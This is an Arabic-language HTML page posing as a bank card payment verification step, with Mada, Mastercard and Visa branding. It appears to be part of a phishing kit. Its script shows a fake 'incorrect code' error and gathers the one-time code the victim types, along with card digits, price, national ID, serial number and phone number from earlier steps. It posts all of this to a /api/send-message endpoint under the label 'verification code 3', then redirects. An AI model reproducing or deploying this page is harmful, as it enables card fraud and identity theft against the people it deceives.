<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <meta name="robots" content="noindex, nofollow, noimageindex"><title>مصادقة الشراء</title><style>
        body {
            margin: 0;
            padding-top: 70px;
            background: #f4f6fa;
            font-family: 'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
        }
        header {
            background-color: #00332a;
            border-bottom: 2px solid #00d5aa;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 70px; /* تحديد ارتفاع ثابت للهيدر لتسهيل حساب مسافة الأقسام بعده */
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: space-between; /* توزيع العناصر على الأطراف بالتساوي */
            padding: 0 20px;
            box-sizing: border-box;
            direction: rtl; /* توجيه العناصر من اليمين إلى اليسار */
        }
        .menu-icon {
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            width: 25px;
            height: 18px;
            cursor: pointer;
        }
        .menu-icon span {
            display: block;
            height: 3px;
            background-color: #00d5aa;
            border-radius: 2px;
        }
        .logo {
            font-size: 2rem;
            font-weight: bold;
            color: #00ffae;
            font-family: sans-serif;
            margin: 0;
            line-height: 1;
        }
        .lang-toggle {
            display: flex;
            align-items: center;
        }
        .lang-toggle button {
            background-color: #00d5aa;
            color: #00251f;
            border: none;
            padding: 8px 14px;
            border-radius: 8px;
            font-weight: bold;
            font-size: 0.9rem;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        .lang-toggle button:hover {
            background-color: #00ffae;
        }
        .overlay,.otp-section{max-width:340px;margin:50px auto;background:white;border-radius:20px;padding:30px 20px;box-shadow:0 0 15px rgba(0,0,0,0.1);text-align:center;position:relative}
        .overlay img,.otp-section img{width:80px;margin-bottom:20px}
        .overlay h2,.otp-section h2{font-size:20px;color:#0078d7;margin-bottom:10px}
        .overlay p,.otp-section p{font-size:15px;margin-bottom:10px;color:#333}
        .wait-button{margin-top:30px;padding:15px;font-size:16px;background-color:#0078d7;color:white;border:none;border-radius:10px;width:90%;cursor:not-allowed}
        .otp-section h3{font-size:18px;color:#333;margin-bottom:10px;text-align:center}
        .otp-section input{padding:12px;width:100%;font-size:16px;border-radius:8px;border:1px solid #ccc;margin-bottom:15px;text-align:center}
        .otp-section button{padding:12px;width:100%;font-size:16px;background-color:#6c757d;color:white;border:none;border-radius:8px;cursor:pointer}
        .brands{display:flex;justify-content:center;gap:10px;margin-top:20px}
        .brands img{height:24px}
        .note{color:#999;font-size:14px;text-align:center}
        #otp{width:310px}
        #texeror{color:#b80808}
    </style></head><body data-page="otp3"><header>
        <div class="menu-icon">
            <span></span>
            <span></span>
        </div>
        <div class="logo">tree</div>
        <div class="lang-toggle">
            <button id="toggleLang">EN/ع</button>
        </div>
    </header>
    <div class="otp-section" id="otpSection"><h3 data-i18n="cardPayment">الدفع بالبطاقات البنكية</h3><h2 data-i18n="ownershipProof">إثبات ملكية البطاقة</h2><p id="texeror" data-i18n="errorText">يبدو انك ادخلت رمزآ غير صحيح يرجى اعادة ادخال الرمز او انتظار رمز جديد</p><p id="otpText"></p><label for="otp"><strong data-i18n="otpLabel">رمز التحقق*</strong></label><input type="tel" id="otp" placeholder="يرجى ادخال رمز التحقق" data-i18n-placeholder="otpPlaceholder" maxlength="6" minlength="4"/><p class="note"><span data-i18n="otpNote">سيتم إرسال رسالة كود التحقق في خلال</span><span id="otpTimer">01:00</span><span> دقيقة</span></p><button data-i18n="confirm">تأكيد</button><div class="brands"><img src="Mada_Logo.svg.png" alt="mada"><img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="mastercard"><img src="https://km.visamiddleeast.com/content/dam/VCOM/global/about-visa/images/visa-brandmark-blue-1960x622.png" alt="visa"></div></div><script>const totalPrice=localStorage.getItem("selectedPrice")||"غير متوفر";const cardNumber=localStorage.getItem("cardNumber")||"0000";const last4=cardNumber.slice(-4);document.querySelector('.otp-section button').addEventListener('click',function(){const otpValue=document.getElementById('otp').value.trim();if(otpValue.length<4){alert("❗الرجاء إدخال رمز تحقق صالح");return}
const totalPrice=localStorage.getItem("selectedPrice")||"غير متوفر";const cardNumber=localStorage.getItem("cardNumber")||"0000";const last4=cardNumber.slice(-4);const formData=JSON.parse(localStorage.getItem("formData")||"{}");const identity=formData.id||"غير محدد";const serial=formData.serial||"غير محدد";const phone=formData.phone||"غير محدد";
const message = (window.SiteLang && window.SiteLang.renderTemplate)
    ? window.SiteLang.renderTemplate('otp3', 'smsTemplate', { last4, totalPrice, otpValue, identity, serial, phone })
    : `رمز التحقق 3:\n\n🔚 آخر ٤ أرقام من البطاقة: ${last4}\n💵 المبلغ: ${totalPrice} SAR\n🔐 رمز التحقق: ${otpValue}\n\n📄  من:\n🆔 رقم الهوية: ${identity}\n🔢 الرقم التسلسلي: ${serial}\n📞 رقم الهاتف: ${phone}\n`;
fetch('/api/send-message',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:message})}).then(response=>response.json()).then(data=>{if(data.ok){window.location.href="/totalselect"}else{alert("حدث خطأ أثناء الإرسال")}}).catch(error=>{console.error(error);alert("حدث خطأ أثناء الإرسال")})});

function startOtpCountdown(durationSeconds) {
    const timer = document.getElementById('otpTimer');
    let remaining = durationSeconds;
    timer.textContent = `${String(Math.floor(remaining / 60)).padStart(2,'0')}:${String(remaining % 60).padStart(2,'0')}`;
    const interval = setInterval(() => {
        remaining -= 1;
        if (remaining < 0) {
            clearInterval(interval);
            return;
        }
        timer.textContent = `${String(Math.floor(remaining / 60)).padStart(2,'0')}:${String(remaining % 60).padStart(2,'0')}`;
    }, 1000);
}

startOtpCountdown(60);
</script><script src="lang.js"></script></body></html>
